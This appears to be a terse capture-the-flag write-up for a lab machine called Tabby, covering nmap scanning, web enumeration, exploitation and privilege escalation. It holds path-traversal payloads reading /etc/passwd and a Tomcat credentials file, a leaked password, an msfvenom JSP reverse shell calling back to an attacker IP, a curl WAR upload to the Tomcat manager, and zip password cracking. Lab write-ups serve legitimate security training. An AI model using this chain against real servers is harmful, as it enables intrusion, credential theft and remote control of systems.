# Tabby

### Nmap

```
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 45:3c:34:14:35:56:23:95:d6:83:4e:26:de:c6:5b:d9 (RSA)
|   256 89:79:3a:9c:88:b0:5c:ce:4b:79:b1:02:23:4b:44:a6 (ECDSA)
|_  256 1e:e7:b9:55:dd:25:8f:72:56:e8:8e:65:d5:19:b0:8d (ED25519)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Mega Hosting
|_http-favicon: Unknown favicon MD5: 338ABBB5EA8D80B9869555ECA253D49D
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.41 (Ubuntu)
8080/tcp open  http    Apache Tomcat
| http-methods: 
|_  Supported Methods: OPTIONS GET HEAD POST
|_http-title: Apache Tomcat
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Web Enum

```
http://megahosting.htb/assets/ -> Forbidden

http://megahosting.htb/files/ -> Forbidden

http://megahosting.htb/news.php -> nth

http://megahosting.htb/Readme.txt

http://megahosting.htb:8080/ 
```

### Exploitation

```bash
# found LFI 
http://megahosting.htb/news.php?file=../../../../../../etc/passwd

# found tomcat config file
http://megahosting.htb/news.php?file=../../../../../usr/share/tomcat9/etc/tomcat-users.xml

# reveral user cred
<user username="tomcat" password="$3cureP4s5w0rd123!" roles="admin-gui,manager-script"/>

# create payload
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.29 LPORT=443 -f raw -o reverse.jsp # jsp

# zip reverse shell to war file
zip reverse.war reverse.jsp

# upload payload
curl --upload-file reverse.war -u 'tomcat:$3cureP4s5w0rd123!' "http://$IP:8080/manager/text/deploy?path=/app"

# trigger shell
http://megahosting.htb:8080/app/reverse.jsp

```

### Priv Esc

```bash
# crack zip file (admin@it)
fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt 16162020_backup.zip

# switch ash
su ash:admin@it

# lxd pe
https://steflan-security.com/linux-privilege-escalation-exploiting-the-lxc-lxd-groups/
```
